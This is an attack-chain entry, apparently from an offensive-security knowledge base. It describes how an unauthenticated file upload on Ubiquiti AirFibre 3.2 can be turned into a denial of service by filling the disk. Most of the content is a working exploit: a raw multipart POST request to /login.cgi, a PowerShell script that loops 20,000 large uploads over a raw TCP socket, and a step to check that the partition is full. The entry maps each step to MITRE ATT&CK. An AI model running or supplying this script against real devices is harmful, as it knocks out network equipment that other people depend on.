---
id: ac-ubiquiti-dos-001
tags:
  - file-upload
  - dos
  - unauthenticated
  - disk-exhaustion
  - ubiquiti
  - airfibre
type: attack_chain
tools:
  - '[[tools/PowerShell]]'
tactics:
  - '[[Execution]]'
  - '[[Impact]]'
verified: false
platforms:
  - Embedded Linux
  - Web
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Perform-Unauthenticated-File-Upload]]'
  - '[[procedures/Repeat-Uploads-for-Disk-Exhaustion]]'
  - '[[procedures/Verify-Disk-Exhaustion-Impact]]'
step_count: 3
techniques:
  - '[[Remote File Copy]]'
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:31:10.960Z'
description: >-
  A multi-stage attack exploiting unauthenticated file upload in Ubiquiti
  AirFibre 3.2 to achieve denial of service via disk space exhaustion,
  potentially chainable with LFI for further compromise.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
---
# Unauthenticated File Upload Leading to Disk Exhaustion DoS on Ubiquiti AirFibre 3.2

Multi-stage attack chain demonstrating exploitation of unauthenticated file upload vulnerability in the /login.cgi endpoint of Ubiquiti AirFibre 3.2 firmware, leading to denial of service by exhausting disk space in the /tmp/upload directory, which shares a partition with /var. This can disrupt device services and may be chained with local file inclusion for code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10-30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial File Upload] --> B[Repeated Uploads for DoS]
    B --> C[Verify Impact]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/PowerShell]]

### Target Environment

- Ubiquiti AirFibre 3.2 device running AirOS on Embedded Linux
- Web service on port 80
- Network access to the device (no authentication required)

### Initial Access Requirements

- Direct network connectivity to the target IP
- No credentials needed due to unauthenticated endpoint
- Prior access not required

## Detailed Attack Procedures

### Step 1: Initial Access
procedure: [[procedures/Perform-Unauthenticated-File-Upload]]

**Objective**: Demonstrate unauthenticated file upload to /tmp/upload via /login.cgi to confirm vulnerability.

**Instructions**: Send a POST request to the /login.cgi endpoint using multipart/form-data without credentials. Use [[commands/unauthenticated-file-upload-post]] to upload a test file:

```http
POST http://[ip]/login.cgi HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 5179
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Host: [ip]

------WebKitFormBoundaryRfhSBNfoYzLOvXnc
Content-Disposition: form-data; name="file"; filename="test6.txt"
Content-Type: text/plain

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

------WebKitFormBoundaryRfhSBNfoYzLOvXnc--
```

**Expected Output**: HTTP 200 OK response; file stored in /tmp/upload/test6.txt on the device.

**Success Indicators**:
- File appears in /tmp/upload directory
- No authentication prompt or error

### Step 2: Execution
procedure: [[procedures/Repeat-Uploads-for-Disk-Exhaustion]]

**Objective**: Exhaust disk space by uploading thousands of large files with unique names to cause DoS on shared /tmp and /var partitions.

**Instructions**: Use PowerShell to loop 20,000 uploads of 90KB files. Execute [[commands/powershell-disk-exhaustion-script]] with target IP set:

```powershell
$ip = "[target-ip]"
$content = "A" * 90000

for ($i=1; $i -le 20000; $i++)
{
$POST = "POST http://$ip/login.cgi HTTP/1.1\nProxy-Connection: keep-alive\nContent-Length: 5278\nCache-Control: max-age=0\nOrigin: http://$ip\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: http://$ip/login.cgi\nAccept-Language: en-US,en;q=0.8\nCookie: last_check=1485458998012; AIROS_SESSIONID=64e0483fab347136fb49fdf81e5542bc; ui_language=en_US\nHost: $ip\n\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition: form-data; name=\"file\"; filename=\"$i.txt\"\nContent-Type: text/plain\n\n$content\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP\nContent-Disposition: form-data; name=\"action\"\n\nupload\n------WebKitFormBoundaryoA1KFlNlMcwhR9SP--\n"
echo $POST | Send-NetworkData -Computer [target-ip] -Port 80
}

function Send-NetworkData {
[CmdletBinding()]
param (
[Parameter(Mandatory)][string]
$Computer,

[Parameter(Mandatory)][ValidateRange(1, 65535)]
[Int16]
$Port,

[Parameter(ValueFromPipeline)]string[]
$Data,

[System.Text.Encoding]
$Encoding = [System.Text.Encoding]::ASCII,

[TimeSpan]
$Timeout = [System.Threading.Timeout]::InfiniteTimeSpan)

begin {
# establish the connection and a stream writer
$Client = New-Object -TypeName System.Net.Sockets.TcpClient
$Client.Connect($Computer, $Port)
$Stream = $Client.GetStream()
$Writer = New-Object -Type System.IO.StreamWriter -ArgumentList $Stream, $Encoding, $Client.SendBufferSize, $true
}
process {
# send all the input data
foreach ($Line in $Data) {
$Writer.WriteLine($Line)
}
}
end {
# flush and close the connection send
$Writer.Flush()
$Writer.Dispose()
$Client.Client.Shutdown('Send')
# read the response
$Stream.ReadTimeout = [System.Threading.Timeout]::Infinite
if ($Timeout -ne [System.Threading.Timeout]::InfiniteTimeSpan) {
$Stream.ReadTimeout = $Timeout.TotalMilliseconds
}

$Result = ''
$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize
do {
try {
$ByteCount = $Stream.Read($Buffer, 0, $Buffer.Length)
} catch [System.IO.IOException] {
$ByteCount = 0
}
if ($ByteCount -gt 0) {
$Result += $Encoding.GetString($Buffer, 0, $ByteCount)
}
} while ($Stream.DataAvailable -or $Client.Client.Connected)

Write-Output $Result
# cleanup
$Stream.Dispose()
$Client.Dispose()
}
}
```

**Expected Output**: Series of successful HTTP responses; after ~20,000 uploads, disk full errors or service disruptions.

**Success Indicators**:
- Uploads succeed initially
- Device services (e.g., radiod) begin failing due to space exhaustion

### Step 3: Objective
procedure: [[procedures/Verify-Disk-Exhaustion-Impact]]

**Objective**: Confirm the DoS impact by checking filesystem usage on the device.

**Instructions**: Access the device shell and run [[commands/df-disk-usage]] to inspect partitions:

```bash
df
```

Observe effects like radiod file size changes indicating service disruption.

**Expected Output**: Output showing /dev/root at 100% usage for /tmp and /var.

**Success Indicators**:
- Filesystem reports full partition
- Device logs show service errors

## Attack Chain Summary

### Key Achievements

1. Confirmed unauthenticated file upload without restrictions
2. Achieved DoS by exhausting shared disk partition
3. Demonstrated potential for chaining with LFI

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Remote File Copy]] Ingress Tool Transfer
- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[OS Exhaustion Flood]] OS Exhaustion Floods

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Impact]] Impact

---

*Last updated: 2024-10-01T00:00:00Z*
